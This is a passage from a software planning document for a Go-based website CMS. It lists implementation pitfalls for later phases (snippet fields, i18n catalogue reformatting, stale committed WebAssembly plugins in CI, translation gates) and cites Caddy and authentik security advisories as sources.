Line 53 is the one that will actually ship if this is not planned for, because
it is the query that "already works".

**How to avoid:**

- The cleanest structural fix: **one carrier discriminator**, not three
  independent columns. Since that would be a table rebuild, the pragmatic version
  is a small `carrier` helper in `internal/field/store.go` that every query uses
  to build its predicate, so adding a fourth carrier later touches one function.
  At minimum: amend all seven sites in one commit and add the `snippet_id` filter
  to line 53 **first**.
- Scope reads and deletes by carrier as well as website (`AND snippet_id IS NULL`
  on the page-field routes, `AND snippet_id = $3` on the snippet routes).
- **Existing snippets must keep working untouched.** The acceptance criterion:
  an installation upgraded to this migration, with snippets that have no fields,
  behaves identically — the Markdown body still renders, `{{ .Snippets.x }}`
  still produces the same `template.HTML`. Write that as a test with a
  pre-migration fixture, and click it in the browser.
- The snippet's Markdown body does **not** become a field. It stays
  `content_markdown` / `content_html` with its bluemonday pass
  (`internal/snippet/store.go:100,115`). Turning it into a `langtext` field would
  route it around the sanitiser.

**Warning signs:**

- The page edit form grows fields nobody added to that website.
- A snippet field's move-up button jumps it to the top of an unrelated list.
- Deleting a page field also removes a snippet field.

**Phase to address:** Phase 8.

---

## Pitfall 27: `MaxFields = 60` is one budget shared by three carriers

**What goes wrong:**

`field.MaxFields = 60` is checked as
`SELECT COUNT(*) FROM page_field_defs WHERE website_id = $1`
(`store.go:217`) — the whole table for that website, regardless of carrier. It is
already shared between page fields, group children and block-kind fields; adding
snippet fields makes it a fourth claimant.

A website with five block kinds of six fields each is already at 30. Add ten
snippets with four fields each and the operator hits "zu viele Felder" while
looking at a page-fields screen that shows nine.

The limit's own comment says it is editorial, not technical: "a form with sixty
extra fields is a form nobody fills in correctly." That argument is about **one
form**, and a shared global count is not one form.

**How to avoid:**

- Count per carrier, not per website: 60 page fields, 60 per block kind, 60 per
  snippet. That matches the stated intent exactly.
- If the global cap is kept as a safety net, raise it and give the error message
  the actual numbers — "58 von 60 Feldern dieser Website sind vergeben, davon 30
  in Bausteinarten" — so the operator can find the ones they forgot.

**Warning signs:**

- "Zu viele Felder" on a screen showing fewer than sixty.

**Phase to address:** Phase 8.

---

## Pitfall 24 (integration, Phases 7 and 8): new kinds and snippet fields fall out of the bundle

**What goes wrong:**

`internal/bundle/export.go` and `import.go` translate field values on the way out
and in — `translateOut` (`export.go:431`) rewrites `KindRef` page ids to slugs and
`KindImage` media ids to filenames so the bundle is portable. A multiple-choice
value, a `zeit`, a `bereich` and a `code` value all fall into the untranslated
default, which is correct for them — but only if someone checks. And snippet
field **definitions** and **values** are new tables' worth of data that
`exportSnippets` (`export.go:296`) does not know about, so they are simply lost.

`CONCERNS.md` records this exact defect shape as already shipped once: *"Bausteine,
die im Bündel fehlten"* — blocks missing from a bundle, found in the browser.
This is the same bug in a new place.

**How to avoid:**

- Every phase that adds a field kind or a field carrier ends with a **round-trip
  test**: export a website that uses the new thing, import the bundle into a
  fresh website, and assert equality. `internal/bundle/bundle_test.go` exists;
  extend it rather than writing a new harness.
- The bundle format version (`internal/bundle/format.go`) needs a bump if the
  manifest gains fields, and the importer must tolerate an older bundle.

**Warning signs:**

- Export a site with snippet fields, import it, and the snippets have no fields.
- `translateOut`'s `switch` was not looked at when a kind was added.

**Phase to address:** Phase 7 and Phase 8, each in its own phase — do not defer
both to a "bundle catch-up" task, because the second one will be forgotten.

---

# Phase 6 — Aufräumen

Low blast radius, high noise. The risk of this phase is that it makes the *rest*
of the milestone harder to review.

---

## Pitfall 25: The i18n reformat buries a real change in 4 600 lines

**What goes wrong:**

`tools/i18n/main.go:289`, `writeCatalog`, writes each catalogue as one key-value
pair per line at column zero:

```go
b.WriteString("{\n")
for i, k := range keys { b.WriteString(quote(k)); b.WriteString(": "); … }
```

Four full catalogues (`en`, `es`, `fr`, `it`) at 1 130 lines each, plus
`de-CH.json` (53), `fr-CH.json` (6), `it-CH.json` (11) — **4 590 lines**. Any
change to the emitted format (adding indentation, changing the separator,
changing the trailing-comma handling) rewrites every one of those lines.

If that reformat lands in the **same commit** as any genuine change — a new key,
a corrected translation, a removed string — the real change is one line in a
4 590-line diff. No reviewer will find it, and `git log -S` will not help because
every line moved. Six months later, "when did this translation change?" is
unanswerable.

**How to avoid:**

- **The reformat is its own commit and touches nothing but the catalogues.** Not
  the tool and the catalogues in one commit either: commit the tool change and
  the regenerated files separately if the tool change alone produces no diff, or
  together *only* if nothing else is in it. The commit message says "nur
  Formatierung, kein Inhalt".
- **Prove it mechanically before committing.** Semantic diff, not textual:

  ```
  for f in internal/i18n/locales/*.json; do
      git show HEAD:"$f" | jq -S . > /tmp/before.json
      jq -S . "$f" > /tmp/after.json
      diff -u /tmp/before.json /tmp/after.json || echo "INHALT GEÄNDERT: $f"
  done
  ```

  Zero output means the reformat changed presentation only. Put this in the
  phase plan as a verification step, and consider adding it to the tool as
  `go run ./tools/i18n -check-format`.
- Do the reformat **first**, before any other Phase 6 work and before Phases 7–10
  add strings. A reformat that lands after two hundred new keys is a reformat
  layered on top of real change.
- `go run ./tools/i18n` must still say `0 offen, 0 verwaist` afterwards.
- Watch `quote()` (`main.go:270`): it deliberately disables HTML escaping so
  `<code>` and `&amp;` stay readable. A reformat that switches to
  `json.MarshalIndent` **re-enables** that escaping and turns every `<` into
  `<` across all five files — a content change disguised as a format change,
  and exactly what the `jq -S` check catches.

**Warning signs:**

- A commit touching `internal/i18n/locales/` with more than ~50 changed lines and
  anything else in it.
- `<` appearing in a catalogue.
- The diff is the whole file.

**Phase to address:** Phase 6, first task.

---

## Pitfall 26: The skipping plugin test — the `.wasm` files are committed, so *staleness* is the real silence

**What goes wrong:**

Five tests skip themselves when a `.wasm` file is missing:

```
internal/plugin/sdk_e2e_test.go:23      plugins/jahreszahl/plugin.wasm
internal/plugin/runtime_test.go:26      testdata/echo.wasm
internal/plugin/hofladen_e2e_test.go:25 plugins/bestellung/plugin.wasm
internal/public/formular_e2e_test.go:160 plugins/kontaktformular/plugin.wasm
internal/public/suche_e2e_test.go:28    plugins/suche/plugin.wasm
```

**The obvious fix is aimed at the wrong problem.** `git ls-files` shows all six
`.wasm` modules **are committed to the repository**. So on any normal checkout
the files are present and the tests run — the skip essentially never fires, and
turning `t.Skipf` into `t.Fatalf` changes almost nothing about coverage while
introducing a new way for a contributor with a sparse or partial checkout to see
a red suite they cannot fix.

The actual silence is different and worse: **`.github/workflows/ci.yml` never
rebuilds the modules** (`grep wasm` finds nothing; the only build step is the
host binary at line 61). So the tests assert against whatever `.wasm` was last
committed. A change to `sdk/` — the ABI, the calling convention, the manifest
handling — is validated against a **stale binary compiled from the old SDK**, and
the suite goes green while the shipped plugins are broken. That is a false pass,
which is strictly worse than a skip, because a skip at least prints a line.

**How to avoid:**

Do both, in this order:

1. **Rebuild the modules in CI and fail on a diff.** A step that runs
   `GOOS=wasip1 GOARCH=wasm go build -o /tmp/x.wasm ./plugins/<name>` for each
   plugin and compares a hash against the committed file. A mismatch means "the
   committed `.wasm` no longer matches its source — rebuild and commit it". This
   is the change that actually closes the hole.
2. **Then** convert the skips to failures — safely, because by then CI proves the
   files are current. Guard it so a contributor is not blocked: skip when
   `testing.Short()` is set, or when an env var like `HOLZCLOUD_SKIP_WASM=1` is
   present, and **fail in CI**. Concretely:

   ```go
   modul, err := os.ReadFile("../../plugins/jahreszahl/plugin.wasm")
   if err != nil {
       if os.Getenv("CI") == "" && testing.Short() {
           t.Skipf("plugin.wasm fehlt: %v — mit `go build` erzeugen", err)
       }
       t.Fatalf("plugin.wasm fehlt: %v — es ist eingecheckt, also stimmt der Checkout nicht", err)
   }
   ```

   The message must say what to do. A bare `t.Fatal` on a contributor's machine
   is a red suite with no instruction.

3. Note the cost: `.github/workflows/security.yml:38–41` records that
   `go test -race ./internal/plugin/` alone takes **297 s** and needed a raised
   timeout. Making more of these tests mandatory affects CI wall time; check the
   timeout again after the change rather than discovering it on a red build.

**Warning signs:**

- `go test ./...` prints `--- SKIP` lines for the plugin tests on a clean
  checkout — that means the checkout is broken, not that the test is optional.
- A change to `sdk/` with a green suite and no `.wasm` in the diff. **This is the
  one to watch for during Phases 7–10**, since none of them touch the SDK and a
  stale module will therefore go unnoticed all milestone.

**Phase to address:** Phase 6.

---

## Pitfall 28 (spans Phases 6–10): the translation gate is a per-phase obligation, not a milestone one

**What goes wrong:**

Every user-visible string must exist in de/en/es/fr/it and
`go run ./tools/i18n` must report `0 offen, 0 verwaist`. Phases 7–10 add a lot of
strings: five field kinds with names and hints (`field.Kinds` uses `i18n.N` for
every one), a whole CSV import screen with per-row warnings, a whole SSO story
with error messages.

Deferring the translation work to the end of the milestone means (a) a single
enormous catalogue commit that collides head-on with Pitfall 25's reformat, and
(b) strings written in a hurry by whoever is left.

There is a second, sharper edge: **error messages that are formatted at runtime**.
`field.Check` builds `d.Label + " muss eine Zahl sein."` by concatenation — a
shape the extractor cannot see and a translator cannot reorder. The CSV
importer's per-row warnings will be tempted into the same shape
(`fmt.Sprintf("Zeile %d: %s", n, reason)`). Use `web.Titlef`/`i18n` formatting
with the whole sentence as one key, as the WordPress importer does
(`wordpress.go:35`: `web.Titlef(r, "Import fehlgeschlagen: %s", err)`).

**How to avoid:**

- `go run ./tools/i18n` reporting `0 offen, 0 verwaist` is a **gate on every
  phase's completion**, in the phase's verification section — not a milestone
  task. The commit-after-phase habit makes this cheap.
- Any new user-facing sentence is one whole `i18n` key with `%s`/`%d` inside it,
  never concatenation.

**Phase to address:** Phases 6, 7, 8, 9 and 10 — as a verification step in each.

---

# Cross-cutting: what every phase in this milestone must do

These are not pitfalls in themselves; they are the gates that catch the ones
above. A roadmapper should attach them to each phase.

1. **A browser pass is a deliverable, not a courtesy.** `offene-punkte.md` ends
   with it and `CONCERNS.md` proves it. Named clicks per phase:
   - **Phase 7:** open a page form containing every new kind, and look at each
     control. Build one condition on each new kind and watch it fire.
   - **Phase 8:** open an existing snippet on an upgraded database; open a page
     form and count the fields.
   - **Phase 9:** import a real `.csv` exported from a real Excel on a Swiss
     locale; re-import it; read the report.
   - **Phase 10:** `curl` the app's port directly from a second machine, over
     IPv4 and IPv6; sign in, sign out, press Back; stop the outpost and sign in
     with the break-glass account; press each of the four `requireFresh` buttons.

2. **`Vary: HX-Request` on every handler that branches on it.** The CSV import
   screen (progress/report partials) and the SSO logout are both likely to.
   Missing it means a cached partial served as a full page, which looks like a
   template bug and is a caching bug.

3. **`internal/admin` is at 14.7 % coverage and is where authorisation lives.**
   Phase 8 and Phase 10 both add handlers there. `internal/admin/page_handler_test.go`
   is the established harness — reuse it, do not invent a second.

4. **No new stored-derived-HTML producer without a replay path.** `CONCERNS.md`
   flags that `content_html` has three producers and only one can be replayed. If
   a snippet field or a `code` field ever produces stored HTML, it inherits that
   problem. Prefer values that render at read time.

5. **Read migrations 00029 and 00038 before writing 00046.** `offene-punkte.md`
   says so and this milestone is the case it was written for.

---

## Sources

**Repository (HIGH confidence — read directly at the cited lines):**
`cmd/holzcloud/main.go`, `internal/auth/{middleware,twofactor,session,elevate,password}.go`,
`internal/admin/{handler,login,page_form,page_fields,wordpress}.go`,
`internal/web/{clientip,headers}.go`, `internal/config/config.go`,
`internal/field/{field,render,store}.go`, `internal/page/store.go`,
`internal/snippet/store.go`, `internal/bundle/{export,import}.go`,
`internal/template/loader.go`, `internal/db/migrations/{00001,00028,00029,00038,00045}`,
`cmd/holzcloud/templates/admin/field_input.html`,
`cmd/holzcloud/assets/admin.css:1096–1111`, `tools/i18n/main.go`,
`plugins/kontaktformular/csv.go`, `deploy/{Caddyfile.example,holzcloud.service}`,
`.github/workflows/{ci,security}.yml`, `.planning/codebase/CONCERNS.md`,
`docs/offene-punkte.md`, `SECURITY.md`.

**External (MEDIUM confidence — vendor advisories and docs, read 2026-09-03):**

- [Caddy GHSA-7r4p-vjf4-gxv4 — `forward_auth copy_headers` does not strip client-supplied headers (CVE-2026-30851)](https://github.com/caddyserver/caddy/security/advisories/GHSA-7r4p-vjf4-gxv4)
- [Caddy GHSA-f59h-q822-g45g — FastCGI header normalisation bypass in `forward_auth copy_headers` (CVE-2026-52845)](https://github.com/caddyserver/caddy/security/advisories/GHSA-f59h-q822-g45g)
- [authentik — Forward auth](https://docs.goauthentik.io/add-secure-apps/providers/proxy/forward_auth)
- [authentik — Caddy configuration for forward auth](https://docs.goauthentik.io/add-secure-apps/providers/proxy/server_caddy/)
- [authentik — Proxy provider (headers, sign_out)](https://docs.goauthentik.io/add-secure-apps/providers/proxy/)
- [authentik — Header authentication](https://docs.goauthentik.io/add-secure-apps/providers/proxy/header_authentication/)
- [authentik GHSA-7jxf-mmg9-9hg7 — password authentication bypass via X-Forwarded-For](https://github.com/goauthentik/authentik/security/advisories/GHSA-7jxf-mmg9-9hg7)
- [Go `encoding/csv` package documentation](https://pkg.go.dev/encoding/csv)
- [Caddy `forward_auth` directive documentation](https://caddyserver.com/docs/caddyfile/directives/forward_auth)

*The CVE identifiers above were reported by search and confirmed against the
GitHub advisory pages themselves. The specific claim a planner should verify at
implementation time is the operator's installed Caddy version — the advisory
names v2.10.0–v2.11.1 as affected and v2.11.2 as fixed.*
